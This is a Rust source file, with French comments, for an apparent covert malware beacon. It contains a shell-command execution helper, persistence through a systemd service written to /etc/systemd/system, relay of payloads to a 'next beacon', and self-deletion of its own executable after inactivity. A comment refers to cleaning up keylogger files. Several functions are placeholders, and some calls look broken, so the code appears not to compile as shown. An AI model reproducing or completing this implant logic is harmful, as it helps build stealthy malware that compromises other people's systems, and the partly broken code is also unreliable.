use std::{env, fs};
use std::cell::RefCell;
use std::error::Error;
use std::fs::File;
use std::process::Command;
use std::time::Instant;
use std::io::Write;

thread_local!(static LAST_ENTRY : RefCell<Instant> = RefCell::new(Instant::now()));

fn main() {
    println!("{}",exec_command("echo Hello world"));
    run().expect("Unable to Run");
}

fn read_entry() -> &'static str {
    //placeholder fonction
    //TODO Truc pour récup' l'entrée
    let entry :&str = "switch toto";

    if !entry.is_empty() {
        LAST_ENTRY.with(|instant| {*instant.borrow_mut() = Instant::now()});
    }
    entry
}

fn transmit_payload_to_next_beacon(entry_string:&str){
    //placeholder fonction
    println!("{}", entry_string)
}

//Read entry messages and transmit them if they are not the mode switch signal
fn read_and_transmit_as_tower(is_operating_as_transmition_tower:bool) -> bool {
    let entry_string: &str = &read_entry(); //get the entry string
    let wake_up_string: &str = "switch";
    if entry_string.split(' ').next().unwrap() == wake_up_string {
        !is_operating_as_transmition_tower
    } else {
        transmit_payload_to_next_beacon(entry_string);
        is_operating_as_transmition_tower
    }
}

fn exec_command(cmd: &str) -> String {
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", cmd])
            .output()
            .expect("sh failed to execute")
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(cmd)
            .output()
            .expect("sh failed to execute")
    };
    String::from_utf8(output.stdout).unwrap()
}

fn exec_on_boot() {
    let exe = env::current_exe().expect("Failed to get current exe");
    let mut file = File::create("/etc/systemd/system/beacon_need.service").unwrap();
    writeln!(file,
             "[Unit]\nDescription=Well it s for a beacon\n\n[Service]\nType=oneshot\nExecStart={}\n\n[Install]\nWantedBy=multi-user.target",
             exe.to_str().unwrap()).expect("Unable to Write");
    Command::new("sh")
        .arg("-c")
        .arg("systemctl enable beacon_need.service")
        .spawn()
        .expect("systemctl failed to execute");
}


fn run() {
    //fonction principale d'execution
    let mut is_operating_as_transmition_tower = true; //determined the running mode of the beacon
    exec_on_boot().expect("Unable to exec on startup");

    //boucle principale du programme
    loop {
        if is_operating_as_transmition_tower {
            //act as the transmition tower, aka read for change and forward message
            is_operating_as_transmition_tower = read_and_transmit_as_tower(is_operating_as_transmition_tower);
            println!("je suis une tour");
        } else {
            println!("je suis actif");
        }

        if LAST_ENTRY.with(|instant| {(*instant.borrow()).elapsed().as_secs() >= 2}) {
            //Ne pas oublier de clear les fichiers residuels (keylogger et startup)
            //auto-destruction
            let exe = env::current_exe().expect("Failed to get current exe");
            fs::remove_file(&exe).expect("Failed to delete current exe");
            break
        }
    }
}